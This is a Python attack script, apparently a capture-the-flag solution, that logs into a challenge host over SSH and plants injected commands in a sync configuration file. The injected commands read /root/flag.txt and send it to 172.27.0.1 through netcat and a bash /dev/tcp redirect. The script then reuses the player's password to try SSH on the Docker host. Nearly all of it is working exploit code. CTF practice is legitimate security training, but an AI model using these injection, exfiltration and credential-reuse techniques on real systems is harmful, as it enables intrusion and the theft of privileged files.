#!/usr/bin/env python3
"""Try netcat exfiltration"""
import paramiko
import time
import socket
import threading

HOST = "instance.ctf.tdho.st"
PORT = 32971
USER = "player"
PASSWORD = "reyalp"

def listen_for_flag(port=4444):
    """Listen for incoming flag"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(1)
        s.settimeout(30)
        print(f"[*] Listening on port {port}...")
        conn, addr = s.accept()
        data = conn.recv(4096).decode()
        print(f"\n[FLAG RECEIVED from {addr}]:")
        print(data)
        conn.close()
        s.close()
        return data
    except Exception as e:
        print(f"[Listener error]: {e}")
        return None

# Start listener in background
# listener_thread = threading.Thread(target=listen_for_flag)
# listener_thread.daemon = True
# listener_thread.start()

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD)

def cmd(c, timeout=10):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=timeout)
    return (stdout.read() + stderr.read()).decode()

print("[*] Trying netcat exfiltration...")

# Check if nc is available
nc_check = cmd("which nc netcat ncat 2>/dev/null")
print(f"Netcat available: {nc_check}")

if nc_check.strip():
    # Try to exfiltrate to Docker host port 8080
    payload = 'talldwarf-sync-command=cat /root/flag.txt | nc 172.27.0.1 8080'
    print(f"\n[Setting payload]: {payload}")
    cmd(f'echo "{payload}" > /opt/mc/config/sync-request.conf')
    
    print("[Waiting 15 seconds...]")
    time.sleep(15)
    
    # Check if anything appeared on port 8080
    check_api = '''python3 -c "import urllib.request; print(urllib.request.urlopen('http://172.27.0.1:8080/', timeout=2).read())" 2>/dev/null'''
    result = cmd(check_api)
    if result.strip():
        print(f"API response: {result}")

# Try bash reverse shell syntax
print("\n[Trying bash redirection to TCP socket]...")
bash_payload = 'talldwarf-sync-command=cat /root/flag.txt > /dev/tcp/172.27.0.1/8080'
cmd(f'echo "{bash_payload}" > /opt/mc/config/sync-request.conf')
time.sleep(15)

# Check Docker host SSH with found credentials
print("\n[Trying SSH to Docker host with player:reyalp]...")
try:
    host_ssh = paramiko.SSHClient()
    host_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    host_ssh.connect("172.27.0.1", port=22, username="player", password="reyalp", timeout=5)
    stdin, stdout, stderr = host_ssh.exec_command("cat /root/flag.txt", timeout=5)
    flag = stdout.read().decode()
    if flag.strip():
        print(f"\n*** FLAG from Docker host ***: {flag}")
    host_ssh.close()
except Exception as e:
    print(f"SSH to host failed: {e}")

ssh.close()
